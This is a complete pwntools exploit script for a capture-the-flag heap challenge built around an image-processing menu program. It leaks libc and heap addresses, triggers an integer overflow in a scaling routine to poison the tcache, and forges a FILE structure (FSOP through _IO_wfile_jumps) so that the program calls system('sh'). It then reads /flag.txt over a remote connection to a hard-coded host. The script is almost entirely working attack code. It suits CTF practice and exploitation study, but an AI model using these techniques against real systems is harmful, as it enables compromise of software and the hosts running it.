#!/usr/bin/env python3
from pwn import *

PORT = 47167
HOST = "144.79.188.39"
elf = context.binary = ELF('./chall_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            brva 0x0000000000001A93
            brva 0x0000000000001496
            brva 0x00000000000014F8
            brva 0x0000000000001371
            brva 0x0000000000001704
            brva 0x0000000000001E38
            brva 0x0000000000001800
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)
def s(dt): p.send(dt)
def sl(dt): p.sendline(dt)

def menu(opt):
    sla(b': ', str(opt).encode())

def num(x):
    sla(b': ', str(x).encode())

def new(idx, w, h, bpp):
    menu(1)
    num(idx); num(w); num(h); num(bpp)

def load(idx, dt):
    menu(2)
    num(idx)
    sa(b': ', dt)

def scale(idx, wmul, wdiv, hmul, hdiv, pl):
    menu(3)
    num(idx); num(wmul); num(wdiv); num(hmul); num(hdiv)
    sa(b': ', pl)

def gray(idx):
    menu(4)
    num(idx)

def rgb(idx):
    menu(5)
    num(idx)

def bright(idx, value):
    menu(6)
    num(idx); num(value)

def info(idx):
    menu(7)
    num(idx)

def dump(idx, off, length):
    menu(8)
    num(idx); num(off); num(length)
    
# Stage 1: Leak heap, libc

new(0, 0x500, 1, 1)
new(1, 0x500, 1, 1)
rgb(0)
# GDB()
rgb(1)

new(2, 0x100, 1, 3)

dump(2, 0x0, 0x20)
leak = p.recv(0x20)
libc.address = u64(leak[0x0:0x8]) - 0x21b250
log.success(f'libc_base: {hex(libc.address)}')

heap = (u64(leak[0x10:0x18]) >> 12) << 12
log.success(f'heap_base: {hex(heap)}')


# Stage 2: FSOP

def encode(raw) -> bytes:
    out = bytearray()
    for i in range(0, len(raw), 3):
        tri = raw[i:i+3].ljust(3, b"\x00")
        out += bytes([tri[2], tri[1], tri[0]])
    return bytes(out)

chunk2 = heap + 0x2a0

fsop = flat({
    0x0: b'  sh\x00\x00\x00\x00',
    0x20: 0,  # write_base
    0x28: 1,  # write_ptr
    0x68: libc.sym.system,  # wide_vtable[0x68]
    0x88: chunk2 + 0x200,  #_lock
    0xa0: chunk2,          # _wide_data
    0xd8: libc.sym._IO_wfile_jumps,  # vtable
    0xe0: chunk2           # wide_vtable
    }, filler = b'\x00')

load(2, encode(fsop))

new(4, 0x28, 1, 1)
new(5, 0x40, 1, 1)
new(6, 0x40, 1, 1)

rgb(4)
rgb(6)
rgb(5)  # 5 -> 6

chunk4 = heap + 0x7b0
tg = (chunk4 >> 12) ^ libc.sym._IO_list_all
pl = flat(b'A'*0x20, 0, 0x51, tg)
# GDB()
scale(4, 0x558, 0x28, 0xff804, 1, encode(pl)) # 0x558*0xff804*3 = 0x100000020

new(7, 0x40, 1, 1)
new(8, 0x15, 1, 3)
# GDB()
load(8, encode(p64(chunk2)))
menu(0)

sl(b'cat /flag.txt')
p.interactive()

# d1nhdwc